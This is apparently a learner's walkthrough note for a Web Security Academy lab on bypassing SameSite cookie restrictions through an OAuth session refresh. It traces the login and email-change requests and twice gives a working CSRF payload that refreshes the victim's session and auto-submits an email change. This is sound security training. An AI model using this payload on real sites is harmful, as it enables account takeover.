
[...back](../note-1.md)

*spoiler*
```html
<form method="POST" action="https://0afd009503f8b17c83fcdde700c00059.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://0afd009503f8b17c83fcdde700c00059.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

---

# 1 login sequence

`GET /social-login`
> We are now redirecting you to login with social media...

`GET /auth?client_id=ca618wz412tssdzv186s1&redirect_uri=https://0a0c00c403423c9180a0851600f60055.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`
> Redirecting to /interaction/We58poRePESu8nTQFyRzV.

`POST /interaction/We58poRePESu8nTQFyRzV/login`
`username=a&password=b`
> Invalid username/email or password.

`username=wiener&password=peter`

> click button to confirm success login
`POST /interaction/We58poRePESu8nTQFyRzV/confirm`
`GET /auth/We58poRePESu8nTQFyRzV`
> Redirecting to https://0a0c00c403423c9180a0851600f60055.web-security-academy.net/oauth-callback?code=mY08q8o1oo33-MPCslqLFhcRfQ7FDWYwcD7xfz1STZr.
`GET /oauth-callback?code=mY08q8o1oo33-MPCslqLFhcRfQ7FDWYwcD7xfz1STZr`
> You have successfully logged in with your social media account
> set effective cookie (new) for lab domain
> back to lab home `GET /`

# 2 change email sequence

`POST /my-account/change-email`
`email=a%40b`

# 3 site cookie restriction

`Set-Cookie: session=1FmHY4MEa9r8lMX3E2gRm9O25oBHqZAC; Expires=Sun, 09 Nov 2025 08:04:01 UTC; Secure; HttpOnly'

---

# 4 key investigation

`POST /my-account/change-email` <<< `GET` not allowed

`<form POST /my-account/change-email>` csrf is ok within 2 mins after login due to OAuth state save

`GET /social-login` starts login chain
> if already login, this request = refresh cookie with OAuth without interaction required = refresh 2 mins

# 5 plan

target click!
> refresh OAuth cookie
> submit `<form POST /my-account/change-email>`

# 6 payload

```html
<form method="POST" action="https://0afd009503f8b17c83fcdde700c00059.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://0afd009503f8b17c83fcdde700c00059.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

---

[...back](../note-1.md)
